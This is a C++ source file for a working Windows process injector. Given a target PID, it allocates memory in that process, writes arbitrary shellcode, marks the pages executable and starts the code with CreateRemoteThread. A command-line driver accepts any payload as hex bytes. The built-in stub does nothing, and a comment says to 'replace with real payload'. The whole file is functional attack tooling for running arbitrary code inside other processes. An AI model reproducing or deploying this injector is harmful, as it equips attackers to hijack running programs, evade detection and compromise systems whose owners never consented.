// inject.cpp
// Remote process injection: allocate, write, protect, and start a thread.
// Build (smoke block): cl /std:c++17 /DSMOKE /W4 inject.cpp /link /OUT:inject.exe

#include <windows.h>
#include <cstdio>
#include <cstdlib>
#include <vector>

// ---------------------------------------------------------------------------
// Core injection routine
// ---------------------------------------------------------------------------

struct InjectResult {
    DWORD dwLastError;
    bool  bOk;
};

static void report(const char* step, bool ok, DWORD err = 0)
{
    if (ok)
        std::printf("[OK]   %s\n", step);
    else
        std::printf("[FAIL] %s  (GetLastError = %lu)\n", step, err ? err : GetLastError());
}

// Returns the remote thread handle on success (caller must CloseHandle), or NULL.
HANDLE InjectBuffer(
    DWORD                      pid,
    const void*                pBuffer,
    SIZE_T                     cbBuffer,
    DWORD                      flProtect,   // final page protection, e.g. PAGE_EXECUTE_READ
    HANDLE*                    phProcess    // optional out – the opened process handle
)
{
    if (phProcess) *phProcess = NULL;

    // -----------------------------------------------------------------------
    // 1. Open target process
    // -----------------------------------------------------------------------
    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, pid);

    bool okOpen = (hProc != NULL);
    report("OpenProcess", okOpen);
    if (!okOpen) return NULL;

    if (phProcess) *phProcess = hProc;

    // -----------------------------------------------------------------------
    // 2. Allocate RW memory in target (write first, then harden protections)
    // -----------------------------------------------------------------------
    LPVOID pRemote = VirtualAllocEx(
        hProc, NULL, cbBuffer,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);                   // writable so WriteProcessMemory works

    bool okAlloc = (pRemote != NULL);
    report("VirtualAllocEx", okAlloc);
    if (!okAlloc) {
        if (!phProcess) CloseHandle(hProc);
        return NULL;
    }
    std::printf("       Remote base: %p  size: %zu bytes\n", pRemote, cbBuffer);

    // -----------------------------------------------------------------------
    // 3. Write buffer into remote memory
    // -----------------------------------------------------------------------
    SIZE_T written = 0;
    bool okWrite = !!WriteProcessMemory(hProc, pRemote, pBuffer, cbBuffer, &written);
    std::printf("       Bytes written: %zu / %zu\n", written, cbBuffer);
    report("WriteProcessMemory", okWrite);
    if (!okWrite) {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        if (!phProcess) CloseHandle(hProc);
        return NULL;
    }

    // -----------------------------------------------------------------------
    // 4. Change page protection to requested value
    // -----------------------------------------------------------------------
    DWORD oldProtect = 0;
    bool okProt = !!VirtualProtectEx(hProc, pRemote, cbBuffer, flProtect, &oldProtect);
    std::printf("       Protection: 0x%08lX -> 0x%08lX\n", oldProtect, flProtect);
    report("VirtualProtectEx", okProt);
    if (!okProt) {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        if (!phProcess) CloseHandle(hProc);
        return NULL;
    }

    // -----------------------------------------------------------------------
    // 5. Flush instruction cache so the CPU sees the new bytes
    // -----------------------------------------------------------------------
    bool okFlush = !!FlushInstructionCache(hProc, pRemote, cbBuffer);
    report("FlushInstructionCache", okFlush);
    // Non-fatal; continue regardless.

    // -----------------------------------------------------------------------
    // 6. Create remote thread at base of allocated region
    // -----------------------------------------------------------------------
    DWORD  remoteThreadId = 0;
    HANDLE hThread = CreateRemoteThread(
        hProc,
        NULL,                              // default security
        0,                                 // default stack size
        reinterpret_cast<LPTHREAD_START_ROUTINE>(pRemote),
        NULL,                              // no parameter
        0,                                 // start immediately
        &remoteThreadId);

    bool okThread = (hThread != NULL);
    std::printf("       Remote thread ID: %lu\n", remoteThreadId);
    report("CreateRemoteThread", okThread);

    if (!okThread) {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        if (!phProcess) CloseHandle(hProc);
        return NULL;
    }

    return hThread;   // caller owns hThread (and optionally *phProcess)
}

// ---------------------------------------------------------------------------
// Smoke / standalone entry point
// ---------------------------------------------------------------------------

#ifdef SMOKE

// Minimal x64 shellcode: just a RET.  Replace with real payload.
static const BYTE g_stub[] = {
    0x48, 0x31, 0xC0,  // xor rax, rax
    0xC3               // ret
};

int main(int argc, char* argv[])
{
    if (argc < 2) {
        std::fprintf(stderr, "Usage: inject.exe <pid> [buffer_hex...]\n");
        std::fprintf(stderr, "  buffer_hex  optional sequence of hex bytes; "
                             "defaults to a stub RET shellcode.\n");
        return 1;
    }

    DWORD pid = static_cast<DWORD>(std::strtoul(argv[1], nullptr, 10));
    if (pid == 0) {
        std::fprintf(stderr, "Invalid PID.\n");
        return 1;
    }

    // Build buffer from optional hex args, or use the built-in stub.
    std::vector<BYTE> buf;
    if (argc > 2) {
        for (int i = 2; i < argc; ++i) {
            unsigned long v = std::strtoul(argv[i], nullptr, 16);
            buf.push_back(static_cast<BYTE>(v & 0xFF));
        }
    } else {
        buf.assign(g_stub, g_stub + sizeof(g_stub));
    }

    std::printf("Injecting %zu bytes into PID %lu ...\n", buf.size(), pid);

    HANDLE hProc   = NULL;
    HANDLE hThread = InjectBuffer(pid, buf.data(), buf.size(),
                                  PAGE_EXECUTE_READ, &hProc);

    if (!hThread) {
        std::printf("Injection failed.\n");
        if (hProc) CloseHandle(hProc);
        return 1;
    }

    // Wait up to 5 s for the remote thread to finish.
    DWORD wait = WaitForSingleObject(hThread, 5000);
    if (wait == WAIT_OBJECT_0) {
        DWORD exitCode = 0;
        GetExitCodeThread(hThread, &exitCode);
        std::printf("[OK]   Remote thread exited with code %lu\n", exitCode);
    } else {
        std::printf("[INFO] Remote thread still running (wait result: %lu)\n", wait);
    }

    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}

#endif // SMOKE
